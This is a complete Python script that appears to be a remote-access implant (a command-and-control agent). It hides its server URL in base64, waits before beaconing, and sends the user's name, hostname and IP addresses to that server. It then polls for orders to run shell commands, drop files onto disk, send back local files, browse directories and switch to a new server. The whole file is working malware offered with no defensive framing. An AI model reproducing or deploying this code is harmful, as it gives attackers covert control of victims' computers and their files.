import base64
import getpass
import json
import os
from pathlib import Path
import socket
import subprocess
import time
import urllib.request

url = base64.b64decode('aHR0cHM6Ly9bMjAxOmI0Nzk6Mjc3MTo4ZGY0OmI1ZWI6ZDAwNzo2M2IwOjI4Mzhd').decode()
uuid = 'd71f1722-cf0b-4e27-9f8e-c95ec9b24a23'
sleep = 300

def exchange(kind, data=None):
    body = json.dumps({'uuid': uuid, 'type': kind, 'data': data}).encode()
    request = urllib.request.Request(url, data=body, headers={'Content-Type': 'application/json'}, method='POST')
    with urllib.request.urlopen(request, timeout=60) as response:
        return json.load(response)

def agent():
    global uuid, url, sleep
    time.sleep(600)
    identity = {'username': getpass.getuser(), 'hostname': socket.gethostname(),
                'ips': socket.gethostbyname_ex(socket.gethostname())[2]}
    uuid = exchange('checkin', identity)['uuid']
    while True:
        tasks = exchange('tasking')
        for task in tasks:
            command, argument = task['command'], task.get('data', '')
            try:
                if task['command'] == 'shell':
                    interpreter = ['cmd.exe', '/c'] if os.name == 'nt' else ['/bin/sh', '-c']
                    output = subprocess.check_output(interpreter + [argument], stderr=subprocess.STDOUT)
                elif command == 'upload':
                    content = exchange('getfile', argument)
                    Path(task['path']).write_bytes(base64.b64decode(content['data']))
                    output = b'OK'
                elif command == 'download':
                    output = Path(argument).read_bytes()
                elif command == 'cd':
                    os.chdir(argument)
                    output = os.getcwd().encode()
                elif command == 'ls':
                    output = '\n'.join(os.listdir('.')).encode()
                elif command == 'pwd':
                    output = os.getcwd().encode()
                elif command == 'churl':
                    url = argument
                    output = b'OK'
                elif command == 'chtime':
                    sleep = int(argument)
                    output = b'OK'
                else:
                    continue
            except Exception as error:
                output = str(error).encode()
            exchange('result', base64.b64encode(output).decode())
        time.sleep(sleep)

if __name__ == '__main__':
    agent()
